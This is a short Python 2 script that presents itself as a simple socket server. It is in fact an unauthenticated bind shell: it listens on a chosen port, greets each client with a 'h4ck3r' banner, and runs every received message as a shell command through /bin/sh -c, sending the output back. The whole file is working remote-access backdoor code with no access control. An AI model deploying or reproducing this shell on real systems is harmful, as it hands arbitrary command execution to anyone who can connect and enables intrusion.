#!/usr/bin/python
from thread import start_new_thread
import socket
import struct
import argparse
import subprocess

par = argparse.ArgumentParser(description='Simple Socket Server')
par.add_argument('PORT',help='Port to listen on',type=int)
args = par.parse_args()

#Sets buffer size
buff = 1024

def recv_all(sock,n):
    data = ''
    while len(data) < n:
        p = sock.recv(n-len(data))
        if not p:
            return None
        data += p
    return data

def recv_data(sock):
    msglen = recv_all(sock,4)
    if not msglen:
        return None
    mlen = struct.unpack('>I',msglen)[0]
    return recv_all(sock,mlen)

def send_data(sock,data):
    msg = struct.pack('>I',len(data))+data
    sock.sendall(msg)

s = socket.socket()
s.bind(('',args.PORT))
s.listen(5)

def client_conn(conn,addr,buff):
    send_data(conn,'You are now a 1337 h4ck3r\n')
    while True:
        data = recv_data(conn)
        if not data:
            break
        print 'Command received from '+addr[0]+':'+data.strip()
        result = subprocess.check_output(['/bin/sh','-c',data])
        send_data(conn,result)
    conn.close()

while True:
    conn,addr = s.accept()
    print 'Connection received from %s on %s' %(addr[0],addr[1])
    start_new_thread(client_conn,(conn,addr,buff))
